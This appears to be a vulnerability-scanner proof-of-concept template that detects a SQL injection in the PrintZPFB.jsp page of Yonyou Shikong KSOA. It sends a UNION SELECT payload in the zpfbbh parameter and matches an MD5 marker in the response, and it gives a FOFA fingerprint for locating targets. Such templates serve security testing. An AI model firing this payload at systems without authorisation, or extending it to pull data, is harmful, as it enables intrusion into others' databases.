id: poc-yaml-yongyou-ksoa-printzpfb-jsp-sqli
info:
  name: 用友时空KSOA PrintZPFB.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 用友时空KSOA
    fofa: app="用友-时空KSOA"

variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"
  t3: "{{gbk_encode('招聘渠道')}}"

http:
  - method: GET
    path:
      - "/kp/PrintZPFB.jsp?zpfbbh=1%27+union+select+1,2,3,4,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))+--+"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
        part: body
      - type: word
        words:
          - "{{t3}}"
        part: body
